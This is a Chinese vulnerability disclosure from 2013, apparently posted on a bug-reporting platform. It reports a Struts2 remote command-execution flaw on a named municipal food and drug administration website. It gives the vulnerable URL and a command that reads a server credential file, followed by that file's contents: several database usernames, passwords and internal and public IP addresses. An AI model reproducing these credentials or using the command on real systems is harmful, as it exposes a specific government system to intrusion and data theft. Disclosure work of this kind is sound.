漏洞详情 披露状态：   									2013-08-20：	细节已通知厂商并且等待厂商处理中									2013-08-25：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某市食品药品监管局struts2命令执行漏洞，导致数据库连接信息和邮箱密码泄漏 详细说明：  江阴市食品药品监管局struts2命令执行漏洞http://fda.jiangyin.gov.cn/jyfda/sitePages/subPages/page.actionhttp://fda.jiangyin.gov.cn/jyfda/sitePages/subPages/page.action>cat /webapp/jyfda/WEB-INF/classes/jdbc.propertieswcms.jdbc.driverClassName=com.mysql.jdbc.Driverwcms.jdbc.url=jdbc:mysql://192.168.1.106/jywcms?autoReconnect=truewcms.jdbc.username=jygovwcms.jdbc.password=!Q2w#E$R5twcmsfunction.jdbc.driverClassName=com.mysql.jdbc.Driverwcmsfunction.jdbc.url=jdbc:mysql://192.168.1.106/jywcms_function?autoReconnect=truewcmsfunction.jdbc.username=jygovwcmsfunction.jdbc.password=!Q2w#E$R5tcount.jdbc.driverClassName=com.mysql.jdbc.Drivercount.jdbc.url=jdbc:mysql://192.168.1.106/count?autoReconnect=truecount.jdbc.username=jygovcount.jdbc.password=!Q2w#E$R5tzwgk.jdbc.driverClassName=com.mysql.jdbc.Driverzwgk.jdbc.url=jdbc:mysql://192.168.1.106/jywcms?autoReconnect=truezwgk.jdbc.username=jygovzwgk.jdbc.password=!Q2w#E$R5t #12345.jdbc.driverClassName=oracle.jdbc.driver.OracleDriver#12345.jdbc.url=jdbc:oracle:thin:@192.168.1.122:1521:JYZW#12345.jdbc.username=superman#12345.jdbc.password=supermanadmin	12345.jdbc.driverClassName=com.microsoft.jdbc.sqlserver.SQLServerDriver12345.jdbc.url=jdbc:microsoft:sqlserver://32.58.254.242:1433;Databasename=Jy12345Temp12345.jdbc.username=sa12345.jdbc.password=gtig_newtech**##   漏洞证明：
